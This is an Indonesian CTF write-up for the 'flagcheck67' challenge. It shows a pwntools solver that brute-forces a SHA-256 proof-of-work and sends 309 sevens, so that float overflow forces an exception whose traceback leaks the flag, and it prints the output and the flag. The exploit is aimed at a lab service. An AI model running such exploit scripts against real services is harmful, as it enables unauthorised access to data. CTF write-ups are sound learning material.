# Writeup CTF — flagcheck67

## Challenge Info

**Kategori:** Misc / Python
**Judul:** flagcheck67
**Flag:** `scriptCTF{ch47_g3n_4lph4_15_50_c00k3d}`

## Deskripsi Singkat

Challenge memberikan service remote yang diawali dengan proof-of-work. Setelah proof-of-work berhasil, server meminta satu input. Jika input salah, server biasanya langsung menutup koneksi tanpa output.

Saat input tidak valid seperti `ls`, server menampilkan traceback dan membocorkan sebagian source code:

```python
assert all([(x in "67") for x in list(inp)])
num = float(inp)
```

Artinya input hanya boleh berisi karakter `6` dan `7`, lalu input tersebut dikonversi menjadi `float`.

## Recon Awal

Setelah konek ke service, server memberikan PoW:

```text
sha256(prefix + ???) == 0000000000000000000000(22 leading zero bits)...
```

PoW diselesaikan dengan brute force nonce sampai hash SHA-256 memiliki 22 leading zero bits.

Setelah PoW berhasil, server menampilkan:

```text
Proof-of-work correct! Continuing to the challenge...
```

Percobaan input valid seperti `6`, `7`, `67`, dan variasi panjang hanya membuat server menutup koneksi tanpa output. Dari hasil fuzz, banyak payload valid hanya menghasilkan `Receiving all data: Done (0B)`, sedangkan payload invalid yang mengandung karakter selain `6` dan `7` memicu `AssertionError`.

## Source Code Lokal

Dari file `check.py`, logic challenge adalah:

```python
import random, time

inp = input().strip()
assert all([(x in "67") for x in list(inp)])
num = float(inp)

print(
    'wrong' if
    num < 67676767
    or 676767676767676767 % (6767676767676767676767676767 / num) == 676767.67
    or random.randint(676767676767, 6767676767676767676) % num
    or num > 6767676767676767
    or num // 676767 * 676767 == num
    or pow(67, 67) // 67676767676767 == num
    or num + 676767 == 67676767676767
    else 'scriptCTF{fakeflag6767}'
)
```

Kondisi ini hampir mustahil dilewati secara normal karena terdapat pengecekan random:

```python
random.randint(676767676767, 6767676767676767676) % num
```

Agar mencapai branch flag secara normal, hasil modulo random tersebut harus bernilai `0`. Peluangnya sangat kecil dan tidak realistis untuk dibruteforce, apalagi setiap percobaan membutuhkan PoW.

## Ide Eksploitasi

Kelemahan utamanya adalah semua logic berada dalam satu baris `print(...)`. Jika terjadi exception pada baris tersebut, Python akan mencetak traceback yang berisi seluruh baris kode, termasuk string flag asli di bagian `else`.

Input hanya boleh karakter `6` dan `7`, tetapi karena input dikonversi menggunakan:

```python
num = float(inp)
```

kita bisa mengirim angka yang sangat panjang, misalnya:

```python
"7" * 309
```

Di Python, angka desimal sepanjang ini akan dikonversi menjadi:

```python
float("7" * 309) == inf
```

Maka bagian ini:

```python
6767676767676767676767676767 / num
```

menjadi:

```python
6767676767676767676767676767 / inf
# hasilnya 0.0
```

Kemudian program mencoba melakukan:

```python
676767676767676767 % 0.0
```

Hal ini menyebabkan:

```text
ZeroDivisionError: float modulo
```

Karena exception terjadi pada baris `print(...)`, traceback membocorkan seluruh baris tersebut, termasuk flag asli.

## Solver

```python
from pwn import *
import hashlib
import re

HOST = "challs.scriptsorcerers.xyz"
PORT = 10244  # ganti sesuai port instance aktif

context.log_level = "debug"

def solve_pow(io):
    data = io.recvuntil(b"???: ")
    print(data.decode(errors="replace"), end="")

    m = re.search(
        rb"sha256\(([^ ]+) \+ \?\?\?\) == 0+\((\d+) leading zero bits\)",
        data
    )

    if not m:
        raise SystemExit("POW regex gagal")

    prefix = m.group(1)
    bits = int(m.group(2))

    nonce = 0

    while True:
        guess = str(nonce).encode()
        digest = hashlib.sha256(prefix + guess).digest()

        if int.from_bytes(digest, "big") >> (256 - bits) == 0:
            print(f"[+] pow = {guess.decode()}")
            io.sendline(guess)
            return

        nonce += 1

def main():
    io = remote(HOST, PORT)

    solve_pow(io)

    banner = io.recvrepeat(1)
    print(banner.decode(errors="replace"), end="")

    payload = "7" * 309
    print(f"[+] sending overflow payload len={len(payload)}")

    io.sendline(payload.encode())

    out = io.recvall(timeout=15)
    text = out.decode(errors="replace")

    print(text)

    m = re.search(r"scriptCTF\{[^}]+\}", text)

    if m:
        print(f"[+] FLAG: {m.group(0)}")

if __name__ == "__main__":
    main()
```

## Output

```text
Proof-of-work correct! Continuing to the challenge...

[+] sending overflow payload len=309

Traceback (most recent call last):
  File "/app/main.py", line 31, in <module>
    print('wrong' if num < 67676767 or 676767676767676767%(6767676767676767676767676767/num) == 676767.67 or random.randint(676767676767, 6767676767676767676)%num or num > 6767676767676767 or num//676767*676767==num or pow(67,67)//67676767676767==num or num+676767==67676767676767 else 'scriptCTF{ch47_g3n_4lph4_15_50_c00k3d}')
ZeroDivisionError: float modulo
```

## Flag

```text
scriptCTF{ch47_g3n_4lph4_15_50_c00k3d}
```

